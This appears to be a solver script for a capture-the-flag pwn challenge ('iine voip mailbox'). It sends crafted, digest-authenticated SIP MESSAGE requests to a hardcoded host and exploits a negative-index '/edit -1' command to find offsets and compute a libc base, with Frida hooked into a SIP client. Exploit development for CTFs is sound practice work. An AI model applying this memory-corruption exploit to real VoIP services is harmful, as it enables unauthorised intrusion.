import hashlib
import string
import random
import multiprocessing
from pwn import *
import frida
#context.log_level='debug'

last_recv = 0
res = 0

def on_message(message, data):
    global last_recv    
    aa = message['payload']['message']
    last_recv = aa
    print(aa)

def wait():
    global last_recv, res
    while not last_recv:
        continue
    res = last_recv
    last_recv = 0

def freeswitch(data):
    headers = {'Content-Type': 'text/xml'}
    return requests.post(f'http://{NAME}:{PW}@{HOST}:10030/freeswitch', headers=headers, data=data).text

def auth(nonce):
    uri = "sip:mailbox@iinevoip;transport=tcp"
    realm = 'iinevoip'
    method = "MESSAGE"

    cnonce = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
    ha1 = hashlib.md5(f"{NAME}:{realm}:{PW}".encode()).hexdigest()
    ha2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()
    response = hashlib.md5(f"{ha1}:{nonce}:00000001:{cnonce}:auth:{ha2}".encode()).hexdigest()
    return response, cnonce

def command(cmd):
    payload = f'''MESSAGE sip:mailbox@iinevoip;transport=tcp SIP/2.0
Via: SIP/2.0/TCP 14.40.77.140:8888;rport;branch=z9hG4bKPjc1f3656edecb41a383dd10b7f032baa1;alias
Max-Forwards: 70
From: <sip:{NAME}@iinevoip>;tag=2056482c9f1b494f9bce018e3a9529d7
To: <sip:mailbox@iinevoip>
Call-ID: 152fbd86d74a4025828905fe5a5648db
CSeq: 12802 MESSAGE
User-Agent: MicroSIP/3.21.3
Route: <sip:{HOST}:10002;transport=tcp;lr>
Content-Type: text/plain
Content-Length:     {len(cmd)}

{cmd}'''.encode()

    p.send(payload)

    p.recvuntilS('nonce="')
    nonce = p.recvuntilS('"')[:-1]
    res, cnonce = auth(nonce)
    payload = f'''MESSAGE sip:mailbox@iinevoip;transport=tcp SIP/2.0
Via: SIP/2.0/TCP 14.40.77.140:8888;rport;branch=z9hG4bKPjc1f3656edecb41a383dd10b7f032baa1;alias
Max-Forwards: 70
From: <sip:{NAME}@iinevoip>;tag=2056482c9f1b494f9bce018e3a9529d7
To: <sip:mailbox@iinevoip>
Call-ID: 152fbd86d74a4025828905fe5a5648db
CSeq: 12802 MESSAGE
Route: <sip:{HOST}:10002;transport=tcp;lr>
Proxy-Authorization: Digest username="{NAME}", realm="iinevoip", nonce="{nonce}", uri="sip:mailbox@iinevoip;transport=tcp", response="{res}", algorithm=MD5, cnonce="{cnonce}", qop=auth, nc=00000001
Content-Type: text/plain
Content-Length:     {len(cmd)}

{cmd}'''.encode()

    p.send(payload)


HOST    = '34.84.18.171'
NAME    = 'rkwmdkdlaaa'
PW      = '845568586797bfaef8f8cf23424f99ff'

# HOST    = "localhost"
# NAME    = 'asdf'
# PW      = '3835b4dc092a076e78fd4b25d233dc4b'

def frida_att():    
    session = frida.attach('microsip.exe')
    script = session.create_script(open(r'\\wsl.localhost\\Ubuntu\\home\\zzre\\CTF\\2024\\linectf\\pwn\\iine_voip_mailbox\\solver\\hack.js','r',encoding='UTF-8').read())
    script.on("message",on_message)
    print('[+] Frida attached')
    script.load()
    

print('[+] Start!')
multiprocessing.Process(target=frida_att(), args=()).start()
sleep(3)
p = remote(HOST, 10002)


command(f'/send {NAME} CCCC'.encode())
pause()

offset = 1
for i in range(0x20):
    command(b'/edit -1 ' + p8(offset + i*8))
    sleep(1)
    command(b'/list')
    sleep(1)
    wait()
    if b'0: CCC' in bytes.fromhex(res):
        offset = offset + i*8
        break

for i in range(0x20):
    command(b'/edit -1 ' + p16(offset + ((i*8) << 8)))
    command(b'/edit -1 ' + p16(offset))
    sleep(1)
    command(b'/list')
    sleep(1)
    if b'0: CCC' in bytes.fromhex(res):
        offset = offset + ((i*8) << 8)
        break

lib = u64(b'\xd0\xc0\xda\xe3\xae\x7f\x00\x00')
libc_base = lib - 0x3530d0 - 0x22e000
print(hex(libc_base))
pause()
print(b'/edit -1 ' + p64(libc_base+0x20)[:-2])

command('/list')
wait()
print(bytes.fromhex(res))
print("good")
p.interactive()